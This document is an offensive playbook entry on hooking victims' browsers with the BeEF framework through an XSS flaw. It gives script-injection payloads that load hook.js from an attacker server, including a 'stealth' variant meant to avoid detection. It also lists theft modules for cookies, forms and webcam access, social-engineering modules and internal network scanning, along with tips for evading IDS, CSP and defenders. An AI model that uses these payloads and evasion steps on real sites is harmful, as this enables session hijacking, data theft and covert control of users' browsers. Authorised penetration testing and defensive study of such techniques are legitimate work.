# XSS — BeEF Framework Integration

## When this applies

You have an XSS sink and need post-exploitation capabilities beyond a single payload: live command execution, browser/OS fingerprinting, internal network probing, social-engineering modules, persistent control. BeEF (Browser Exploitation Framework) provides a hooked-browser console where each victim becomes a controllable "zombie."

## Technique

Inject a `<script src=…/hook.js>` that registers the victim's browser with the BeEF server. From the BeEF UI, attacker selects modules to execute on the hooked browser in real time.

## Steps

### Basic Hook Injection

```javascript
<script src="http://BEEF-SERVER:3000/hook.js"></script>
```

### Stealth Hook

```javascript
<script>
// Load BeEF dynamically to avoid detection
var s = document.createElement('script');
s.src = 'http://BEEF-SERVER:3000/hook.js';
document.head.appendChild(s);
</script>
```

### BeEF Capabilities

Once hooked, attacker can:

1. **Browser Information**:
   - OS and browser details
   - Installed plugins
   - Screen resolution
   - Network information

2. **Command Execution**:
   - Execute arbitrary JavaScript
   - Inject additional payloads
   - Module-based attacks

3. **Social Engineering**:
   - Fake notification bars
   - Fake update prompts
   - Clipboard hijacking

4. **Network Attacks**:
   - Port scanning
   - Service fingerprinting
   - Internal network mapping

5. **Data Theft**:
   - Cookie/session theft
   - Form data capture
   - Screenshot capture
   - Webcam/microphone access (with permissions)

### Example BeEF Commands

**Browser Information**:
- Get Browser Details
- Get Cookie
- Get Local Storage
- Get System Info

**Social Engineering**:
- Simple Hijacker
- Clippy
- Fake Flash Update
- Pretty Theft

**Network Discovery**:
- Ping Sweep
- Port Scanner
- Fingerprint Network

**Persistence**:
- Create Pop Under
- Create Iframe
- Man-In-The-Browser

## Verifying success

- BeEF UI shows the victim under "Online Browsers" with hostname, IP, browser version.
- Selected module returns results to the BeEF console (e.g., "Get Cookie" displays the victim's `document.cookie`).
- Hook persists across page navigations if the XSS is reflected on every page (or use Pop-Under module for persistence).

## Common pitfalls

1. **HTTP hook on HTTPS target** — mixed content blocked by browsers. Host BeEF behind HTTPS reverse proxy.
2. **CSP blocks external scripts** — `script-src 'self'` prevents loading `hook.js`. Look for whitelisted CDN domains, base-uri injection, or fall back to inline payloads.
3. **Default BeEF port (3000)** — easily fingerprinted by IDS. Run BeEF on 80/443 behind nginx with TLS.
4. **Hook URL exposed in payload** — defenders find your BeEF server. Use short-lived domains.
5. **Browser navigates away** — hook drops. Combine with iframe-based persistence (`Create Iframe` module) or pop-under.

## Tools

- **BeEF** — `https://github.com/beefproject/beef` — installation: `git clone … && ./install.sh`
- **ngrok / Cloudflare Tunnel** — expose local BeEF server with TLS
- **Caddy / nginx** — reverse proxy with auto-TLS for BeEF hook
- **Browser DevTools → Network** — verify `hook.js` loads and registers (`/dh?token=…` requests)
